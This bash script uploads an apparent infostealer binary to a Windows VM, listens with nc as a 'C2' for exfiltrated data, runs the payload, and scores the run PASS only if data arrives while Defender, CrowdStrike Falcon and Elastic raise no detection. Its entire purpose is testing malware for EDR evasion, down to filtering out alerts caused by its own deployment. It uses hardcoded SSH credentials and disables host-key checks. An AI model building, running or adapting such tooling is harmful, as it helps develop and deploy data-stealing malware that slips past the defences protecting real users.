#!/bin/bash
# Deploy and test an infostealer payload on the Windows VM.
# Usage: deploy_infostealer.sh [payload.exe] [--c2-port PORT] [--timeout SECS] [--sign]

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"

VM_PORT=${VM_PORT:-10022}
VM_USER=${VM_USER:-vmuser}
VM_PASS=${VM_PASS:-vmuser123}
C2_PORT=${C2_PORT:-9001}
VM_SNAPSHOT=${VM_SNAPSHOT:-crowdstrike}
TIMEOUT=${TIMEOUT:-60}
SIGN=""
PAYLOAD="${1:-$PROJECT_DIR/results/latest/payload.exe}"
REMOTE_NAME="payload.exe"

ssh_cmd() {
    sshpass -p "$VM_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p "$VM_PORT" "$VM_USER@localhost" "$@"
}
scp_cmd() {
    sshpass -p "$VM_PASS" scp -o StrictHostKeyChecking=no -P "$VM_PORT" "$@"
}

# Parse extra args
shift 2>/dev/null || true
while [[ $# -gt 0 ]]; do
    case "$1" in
        --c2-port) C2_PORT="$2"; shift 2 ;;
        --timeout) TIMEOUT="$2"; shift 2 ;;
        --sign) SIGN="1"; shift ;;
        *) shift ;;
    esac
done

cleanup() {
    echo ""
    echo "[*] Restoring VM snapshot..."
    if "$SCRIPT_DIR/vm_snapshot.sh" restore "$VM_SNAPSHOT" 2>/dev/null; then
        echo "  OK (restored $VM_SNAPSHOT)"
    else
        echo "  No snapshot to restore, cleaning up manually..."
        ssh_cmd "taskkill /f /im $REMOTE_NAME 2>nul & del /f C:\\Users\\$VM_USER\\Desktop\\$REMOTE_NAME 2>nul" 2>/dev/null || true
        echo "  Done"
    fi
    fuser -k $C2_PORT/tcp 2>/dev/null || true
}
trap cleanup EXIT

echo ""
echo "============================================"
echo "  INFOSTEALER DEPLOY & TEST"
echo "============================================"
echo "  Payload:  $PAYLOAD"
echo "  C2 Port:  $C2_PORT"
echo "  Timeout:  ${TIMEOUT}s"
echo "============================================"
echo ""

# Check payload exists
if [ ! -f "$PAYLOAD" ]; then
    echo "[!] Payload not found: $PAYLOAD"
    exit 1
fi

# Step 0: Sign if requested
if [ -n "$SIGN" ]; then
    echo "[0/6] Signing payload..."
    if "$SCRIPT_DIR/sign_payload.sh" "$PAYLOAD"; then
        echo "  OK — payload signed"
    else
        echo "  [!] Signing failed, continuing unsigned"
    fi
    echo ""
fi

# Step 1: Check VM alive
echo "[1/6] Checking VM connectivity..."
if ! ssh_cmd "echo VM_ALIVE" 2>/dev/null | tr -d '\r' | grep -q "VM_ALIVE"; then
    echo "[!] VM not reachable on port $VM_PORT"
    exit 1
fi
echo "  OK"

# Step 2: Upload payload
echo "[2/6] Uploading payload..."
scp_cmd "$PAYLOAD" "$VM_USER@localhost:Desktop\\$REMOTE_NAME" 2>/dev/null
echo "  OK — uploaded $(stat -c%s "$PAYLOAD") bytes"

# Step 3: Check EDR quarantine
echo "[3/6] Checking EDR quarantine (3s wait)..."
sleep 3
EXISTS=$(ssh_cmd "if exist C:\\Users\\$VM_USER\\Desktop\\$REMOTE_NAME (echo EXISTS) else (echo GONE)" 2>/dev/null | tr -d '\r')
if echo "$EXISTS" | grep -q "GONE"; then
    echo "  QUARANTINED — EDR caught the payload"
    echo ""
    echo "  Defender detection info:"
    ssh_cmd 'powershell -Command "Get-MpThreatDetection | Select-Object -Last 1 | Format-List"' 2>/dev/null | sed 's/^/    /'
    echo ""
    echo "RESULT: EVASION FAIL (static detection)"
    exit 2
fi
echo "  OK — binary survived EDR static scan"

# Step 4: Start C2 listener
echo "[4/6] Starting C2 listener on :$C2_PORT..."
fuser -k $C2_PORT/tcp 2>/dev/null || true
sleep 1
OUT="$PROJECT_DIR/results/latest/exfil_$(date +%Y%m%d_%H%M%S).bin"
timeout "$TIMEOUT" nc -l -p "$C2_PORT" > "$OUT" &
C2_PID=$!
sleep 1
if ! kill -0 $C2_PID 2>/dev/null; then
    echo "  [!] C2 listener failed to start"
    exit 1
fi
echo "  OK — PID $C2_PID (timeout: ${TIMEOUT}s)"

# Step 5: Execute payload
echo "[5/6] Executing payload on VM..."
ssh_cmd "cmd /c \"C:\\Users\\$VM_USER\\Desktop\\$REMOTE_NAME\"" >/dev/null 2>&1 &
EXEC_PID=$!

echo "  Waiting for C2 data..."
wait $C2_PID 2>/dev/null || true

# Step 6: Validate results
echo "[6/6] Validating results..."
echo ""

C2_SIZE=$(stat -c%s "$OUT" 2>/dev/null || echo "0")

# Check binary still on disk
POST_EXISTS=$(ssh_cmd "if exist C:\\Users\\$VM_USER\\Desktop\\$REMOTE_NAME (echo EXISTS) else (echo GONE)" 2>/dev/null | tr -d '\r')

# Check Defender detections
DEFENDER_DETECTIONS=$(ssh_cmd 'powershell -Command "(Get-MpThreatDetection | Where-Object { $_.InitialDetectionTime -gt (Get-Date).AddMinutes(-5) }).Count"' 2>/dev/null | tr -d '\r' | grep -E '^[0-9]+$' || echo "0")

# Check CrowdStrike
CS_STATUS="n/a"
CS_KILLED=""
if ssh_cmd 'sc query csfalconservice' 2>/dev/null | tr -d '\r' | grep -q "RUNNING"; then
    CS_STATUS="active"
    if echo "$POST_EXISTS" | grep -q "GONE"; then
        CS_KILLED="quarantined"
    fi
fi

# Check Elastic alerts
ELASTIC_ALERTS="0"
if command -v curl &>/dev/null; then
    ELASTIC_ALERTS=$(curl -sk -u elastic:changeme "https://localhost:9200/.alerts-security*/_search?size=100" 2>/dev/null | python3 -c "
import json, sys
DEPLOY_NOISE = {'schtasks.exe','tasklist.exe','HOSTNAME.EXE','hostname.exe','cmd.exe','sshd.exe','reg.exe'}
data = json.load(sys.stdin)
count = 0
for h in data.get('hits',{}).get('hits',[]):
    s = h.get('_source',{})
    proc = s.get('process',{}).get('name','')
    parent = s.get('process',{}).get('parent',{}).get('name','')
    if proc in DEPLOY_NOISE or parent in ('sshd.exe','cmd.exe'):
        continue
    count += 1
print(count)
" 2>/dev/null || echo "0")
fi

# Content validation
SECTIONS=""
if [ "$C2_SIZE" -gt 100 ]; then
    SECTIONS=$(strings "$OUT" 2>/dev/null | grep -c '^\[' || echo "0")
fi

echo "============================================"
echo "  RESULTS"
echo "============================================"
echo "  C2 data:          $C2_SIZE bytes"
echo "  Data sections:    $SECTIONS"
echo "  Binary post-exec: $POST_EXISTS"
echo "  Defender:         $DEFENDER_DETECTIONS detections"
echo "  CrowdStrike:      ${CS_STATUS}${CS_KILLED:+ ($CS_KILLED)}"
echo "  Elastic alerts:   $ELASTIC_ALERTS"
echo "  Output file:      $OUT"
echo "============================================"

if [ "$C2_SIZE" -gt 100 ]; then
    echo ""
    echo "  Sections found:"
    strings "$OUT" | grep '^\[' | sed 's/^/    /' | head -20
fi

CS_FAIL=""
if [ "$CS_STATUS" = "active" ] && [ -n "$CS_KILLED" ]; then
    CS_FAIL="1"
fi

if [ "$C2_SIZE" -gt 100 ] && [ "$DEFENDER_DETECTIONS" = "0" ] && [ "$ELASTIC_ALERTS" = "0" ] && [ -z "$CS_FAIL" ] && echo "$POST_EXISTS" | grep -q "EXISTS"; then
    echo ""
    echo "  OVERALL: PASS"
    exit 0
else
    echo ""
    echo "  OVERALL: FAIL"
    [ "$C2_SIZE" -le 100 ] && echo "    - No C2 data received ($C2_SIZE bytes)"
    [ "$DEFENDER_DETECTIONS" != "0" ] && echo "    - Defender detected ($DEFENDER_DETECTIONS threats)"
    [ -n "$CS_FAIL" ] && echo "    - CrowdStrike Falcon detected ($CS_KILLED)"
    echo "$POST_EXISTS" | grep -q "GONE" && echo "    - Binary removed from disk post-execution"
    [ "$ELASTIC_ALERTS" != "0" ] && echo "    - Elastic alerts fired ($ELASTIC_ALERTS)"
    exit 1
fi
